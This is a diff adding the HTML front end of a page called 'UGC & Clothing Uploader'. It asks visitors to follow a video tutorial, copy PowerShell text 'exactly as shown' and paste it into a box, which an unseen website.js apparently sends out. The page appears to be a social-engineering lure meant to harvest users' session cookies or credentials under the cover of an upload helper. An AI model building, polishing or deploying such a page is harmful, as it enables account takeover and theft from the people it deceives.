@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Send Text File</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="page-shell">
+<header class="hero">
+  <div class="hero-badge">★</div>
+  <h1>UGC & Clothing Uploader</h1>
+  <p class="hero-copy">
+    Paste your PowerShell information below to prepare your clothing or UGC upload file.
+  </p>
+</header>
+
+<main class="content">
+  <section class="upload-card">
+    <div class="upload-info">
+      <span class="label">Upload Assistance Tool</span>
+
+      <h2>Paste Your PowerShell Output</h2>
+
+      <p>
+        This tool processes your PowerShell data to prepare a clothing or UGC upload. Follow the tutorial carefully and copy the text exactly as shown for best results.
+      </p>
+
+      <!-- <p>
+        Please only upload content that you copied as doing this multiple times can lead to rate limiting.
+      </p> -->
+    </div>
+
+    <div class="paste-zone">
+      <textarea id="textInput" placeholder="Paste your PowerShell text here"></textarea>
+    </div>
+
+    <div class="actions">
+      <button class="send-button" id="sendButton" disabled>Upload</button>
+    </div>
+
+    <div class="status-panel" id="statusPanel">
+      <div class="loading-spinner" aria-hidden="true"></div>
+      <p class="status-title"></p>
+      <p class="status-details"></p>
+    </div>
+  </section>
+
+  <section class="info-cards">
+    <article class="card">
+      <h3>1. Watch the Tutorial</h3>
+      <p>
+        Before using this tool, watch the full tutorial video. Missing even one step
+        may cause the upload file to generate incorrectly.
+      </p>
+    </article>
+
+    <article class="card">
+      <h3>2. Copy the Correct PowerShell Text</h3>
+      <p>
+        Make sure you copy the PowerShell information exactly as shown in the video.
+        The tool uses that text to locate and prepare the correct upload data.
+      </p>
+    </article>
+
+    <article class="card">
+      <h3>3. Prepare Your Upload</h3>
+      <p>
+        After submitting the text, the tool will process the information and return
+        the file or data needed for your clothing or UGC upload.
+      </p>
+    </article>
+  </section>
+</main>
+  </div>
+
+  <script src="website.js"></script>
+</body>
+</html>
